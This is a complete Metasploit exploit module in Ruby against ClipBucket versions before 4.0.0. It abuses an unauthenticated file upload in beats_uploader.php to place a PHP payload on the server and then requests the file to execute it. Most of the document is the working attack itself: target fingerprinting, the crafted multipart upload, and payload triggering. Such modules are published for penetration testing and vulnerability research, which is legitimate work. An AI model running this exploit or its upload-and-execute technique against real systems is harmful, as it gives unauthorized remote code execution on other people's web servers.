# This module requires Metasploit: https://metasploit.com/download Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ClipBucket beats_uploader Unauthenticated Arbitrary File Upload",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in ClipBucket versions before 4.0.0 (Release 4902).
        A malicious file can be uploaded using an unauthenticated arbitrary file upload vulnerability.
        It is possible for an attacker to upload a malicious script to issue operating system commands.
        This issue is caused by improper session handling in /action/beats_uploader.php file.
        This module was tested on ClipBucket before 4.0.0 - Release 4902 on Windows 7 and Kali Linux.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;www.sec-consult.com&#039;, # Vulnerability Discovery, PoC
          &#039;Touhid M.Shaikh <admin[at]touhidshaikh.com>&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [ &#039;EDB&#039;, &#039;44250&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
          {
            &#039;SSL&#039;     => false,
            &#039;Encoder&#039; => &#039;php/base64&#039;
          },
      &#039;Platform&#039;        => [&#039;php&#039;],
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         =>
        [
          [&#039;Clipbucket < 4.0.0 - Release 4902&#039;, {}]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => "Mar 03 2018",
      &#039;DefaultTarget&#039;   => 0))
 
    register_options(
      [
       OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the ClipBucket application&#039;, &#039;/&#039;])
      ])
  end
 
  def uri
    return target_uri.path
  end
 
  def check
    vprint_status(&#039;Trying to detect ClipBucket on target.&#039;)
 
    # check for readme file
    res = send_request_cgi({
     &#039;method&#039; => &#039;GET&#039;,
     &#039;uri&#039;    => normalize_uri(uri, &#039;readme&#039;)
    })
 
    unless res
      vprint_error(&#039;Connection failed&#039;)
      return CheckCode::Unknown
    end
 
    unless res.code == 200 && res.body.include?(&#039;ClipBucket&#039;)
      vprint_error(&#039;Could not find readme&#039;)
      return CheckCode::Safe
    end
 
    # check for beats_uploader.php file
    res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(uri, &#039;actions&#039;, &#039;beats_uploader.php&#039;)
    })
 
    unless res
      vprint_error(&#039;Connection failed&#039;)
      return CheckCode::Unknown
    end
 
    unless res.code == 200
      vprint_error(&#039;Could not find beats_uploader.php&#039;)
      return CheckCode::Safe
    end
 
    Exploit::CheckCode::Appears
  end
 
  def exploit
 
    stager = &#039;<?php &#039;
    stager << payload.encode
    stager << &#039;?>&#039;
 
    # Setting POST data
    post_data = Rex::MIME::Message.new
    post_data.add_part(stager, content_type = &#039;application/octet-stream&#039;, transfer_encoding = nil, content_disposition = &#039;form-data; name="file"; filename="pfile.php"&#039;) # payload
    post_data.add_part(&#039;1&#039;, content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="plupload"&#039;) # require for uploading
    post_data.add_part(&#039;agent22.php&#039;, content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="name"&#039;)
    data = post_data.to_s
 
 
    print_status(&#039;Uploading payload..&#039;)
    res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;    => normalize_uri(uri, &#039;actions&#039;, &#039;beats_uploader.php&#039;),
        &#039;data&#039;  => data,
        &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}"
    })
 
    jsonres = res.get_json_document
 
    # If the server returns 200 and success yes, we assume we uploaded the malicious
    # file successfully
    unless res && res.code == 200 && jsonres[&#039;success&#039;] == &#039;yes&#039;
      fail_with(Failure::None, "#{peer} - File wasn&#039;t uploaded, aborting!")
    end
    print_good(&#039;Looking For Payload..&#039;)
    pdir = jsonres[&#039;file_directory&#039;]
    file_name = jsonres[&#039;file_name&#039;]
    pext = jsonres[&#039;extension&#039;]
    print_good("found payload in /actions/#{pdir}/#{file_name}.#{pext}")
 
    # Payload name
    pname = "#{file_name}.php"
 
    # Cleanup is Good Idea .
    register_files_for_cleanup(pname)
 
    print_status("Executing Payload [ #{uri}/actions/#{pdir}/#{pname} ]" )
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;actions&#039;, pdir, pname)
    })
 
    # If we don&#039;t get a 200 when we request our malicious payload, we suspect
    # we don&#039;t have a shell, either.
    if res && res.code != 200
      print_error(&#039;Unexpected response, probably the exploit failed&#039;)
    end
  end
end

